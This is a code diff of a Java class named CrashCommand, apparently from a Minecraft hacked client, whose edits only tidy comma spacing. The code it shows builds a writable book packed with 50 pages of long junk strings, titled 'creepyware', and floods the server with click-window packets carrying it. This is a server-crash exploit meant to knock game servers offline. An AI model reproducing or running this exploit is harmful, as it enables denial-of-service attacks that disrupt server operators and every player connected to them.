@@ -18,7 +18,7 @@ class CrashCommand
 
     public
     CrashCommand() {
-        super("crash" , new String[]{"crash"});
+        super("crash", new String[]{"crash"});
     }
 
     @Override
@@ -47,19 +47,19 @@ class CrashCommand
                 ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                 NBTTagList list = new NBTTagList();
                 NBTTagCompound tag = new NBTTagCompound();
-                int pages = Math.min(50 , 100);
+                int pages = Math.min(50, 100);
                 String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                 for (i = 0; i < pages; ++ i) {
                     NBTTagString tString = new NBTTagString(size);
                     list.appendTag(tString);
                 }
-                tag.setString("author" , Util.mc.player.getName());
-                tag.setString("title" , "creepyware");
-                tag.setTag("pages" , list);
-                bookObj.setTagInfo("pages" , list);
+                tag.setString("author", Util.mc.player.getName());
+                tag.setString("title", "creepyware");
+                tag.setTag("pages", list);
+                bookObj.setTagInfo("pages", list);
                 bookObj.setTagCompound(tag);
                 for (i = 0; i < CrashCommand.this.packets; ++ i) {
-                    Util.mc.playerController.connection.sendPacket(new CPacketClickWindow(0 , 0 , 0 , ClickType.PICKUP , bookObj , (short) 0));
+                    Util.mc.playerController.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short) 0));
                 }
             }
         }.start();
